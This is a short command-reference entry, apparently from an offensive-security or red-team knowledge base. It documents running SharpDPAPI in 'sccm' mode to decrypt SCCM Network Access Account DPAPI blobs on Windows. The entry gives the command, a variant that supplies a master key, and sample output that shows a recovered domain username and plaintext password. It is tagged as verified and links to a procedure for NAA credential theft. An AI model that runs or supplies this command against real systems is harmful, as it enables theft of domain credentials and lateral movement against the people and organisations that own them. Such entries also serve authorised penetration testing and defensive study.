---
id: 4e93ebd0-7d9b-49dc-acf0-78ee7cbffe10
name: Decrypt SCCM Blobs With SharpDPAPI
type: command
executor: powershell
data: .\SharpDPAPI.exe sccm
output: null
created_at: '2023-04-06T03:56:08.224309+00:00'
updated_at: '2023-04-10T20:26:02.204187+00:00'
platforms:
  - Windows
tags:
  - dpapi
  - decryption
  - sccm
verified: true
validated: true
---

# Decrypt-SCCM-Blobs-With-SharpDPAPI

## Command

```powershell
.\SharpDPAPI.exe sccm
```

## Description

This command executes SharpDPAPI to decrypt SCCM-specific DPAPI blobs, such as those from the NAA configuration. It targets local machine or user master keys to recover plaintext credentials.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `sccm` | Mode to decrypt SCCM blobs | Yes |
| `.\SharpDPAPI.exe` | Path to the executable | Yes |

## Examples

### Basic Usage

```powershell
.\SharpDPAPI.exe sccm
```

### With Master Key Backup

```powershell
.\SharpDPAPI.exe sccm /masterkey:"C:\backup\masterkey.kdbx"
```

## Expected Output

```

[*] SCCM Blob Decryption

Username: domain\naa_account
Password: PlaintextPassword123!

```

Output shows decrypted NAA credentials if master keys are accessible.

## Related

- [[tools/SharpDPAPI]]
- [[procedures/SCCM-Network-Access-Account-Credential-Theft]]
